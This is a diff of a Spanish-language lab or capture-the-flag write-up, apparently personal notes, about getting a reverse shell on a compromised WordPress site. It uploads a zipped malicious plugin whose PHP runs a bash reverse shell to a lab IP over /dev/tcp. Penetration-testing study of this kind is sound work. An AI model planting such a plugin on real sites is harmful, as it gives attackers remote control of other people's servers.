@@ -164,16 +164,26 @@ finalmente estamos dentro del WordPress
 ### Reverse shell
 para obtener una reverse shell en este wordpress no es posible editar un plugin ya que es nos dara el siguiente mensaja 
 ¨Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.¨ 
-esto nos deja con la posibilidad de aplicar un poco de  pensamiento lateral y es que.... si hemos creado un usuario administrador podriamos tener la oportunidad de subir un archivo.zip como un plugin pero que dentro contenga nuestra carga útil para ejecutar una reverse shell
+esto nos deja con la posibilidad de aplicar un poco de  pensamiento lateral y es que.... si hemos creado un usuario administrador podriamos tener la oportunidad de subir un archivo.zip como un plugin pero que dentro contenga nuestra carga útil para ejecutar una reverse shell esto lo podemos encontrar 
 
-`reverse-shell.php`
+`rshell.php`
 ```python
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/7890 0>&1'");
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.8/9001 0>&1'");
 ?>
 ```
 
-![[Pasted image 20240823132731.png]]
+![[Pasted image 20240823135507.png]]
 
 `reverse-shell.zip`
 ahora con zip vamos a transformar nuestro archivo reverse-shell.php a un archivo zip para poder cargarlo al wordpress
